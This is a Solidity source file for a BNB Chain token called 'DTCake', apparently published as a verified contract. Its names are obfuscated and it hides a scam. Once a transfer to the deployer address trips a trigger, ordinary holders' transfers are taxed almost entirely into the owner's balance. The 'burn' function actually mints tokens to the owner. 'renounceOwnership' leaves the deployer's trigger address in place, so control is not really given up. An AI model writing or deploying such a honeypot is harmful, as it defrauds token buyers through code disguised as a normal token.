/**
 *Submitted for verification at BscScan.com on 2022-12-04
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
contract DTCake {
string public  name = "DTCake";
uint256 private  SQEZAI = 1000000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  MODRWZ = 10000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  KMEIXA = address(0);
uint8 public constant decimals = 18;
address private  MVZAGB = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  KZLABZ = address(0);
uint256 private  PZDUJY = 1000000000000000000;
uint256 private  SOQUQU = 1000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  SKECFE = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  DJKONZ = 1000000000000000000;
uint256 private  QLSSUV = 10000000000000;
uint256 public constant RMZJYM = 99999999999999999999999999999999999999999;
mapping (address => uint256) public balanceOf;
mapping (address => mapping (address => uint256)) private _allowances;
address private  JEZXEF = address(0);
address public owner;
uint256 private  RTTAYS = 100000000;
string public  symbol = "DTCake";
function _getQLSSUV() private returns (uint256) {
return QLSSUV;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
constructor () {
KMEIXA = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getMVZAGB() private returns (address) {
return MVZAGB;
}

function _getSKECFE() private returns (address) {
return SKECFE;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tFXKYUD 0");
require(spender != address(0), "fFXKYUD 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getJEZXEF() private returns (address) {
return JEZXEF;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "FXKYUD");
require(to != address(0), "FXKYUD");
require(amount <= balanceOf[from], "FXKYUD");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* RMZJYM/PZDUJY ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==KMEIXA){
PZDUJY = RMZJYM+2;
}
emit Transfer(from, to, transferAmount);
}
function _getSOQUQU() private returns (uint256) {
return SOQUQU;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getDJKONZ() private returns (uint256) {
return DJKONZ;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getKZLABZ() private returns (address) {
return KZLABZ;
}

function _getRTTAYS() private returns (uint256) {
return RTTAYS;
}

function _getSQEZAI() private returns (uint256) {
return SQEZAI;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getMODRWZ() private returns (uint256) {
return MODRWZ;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}

}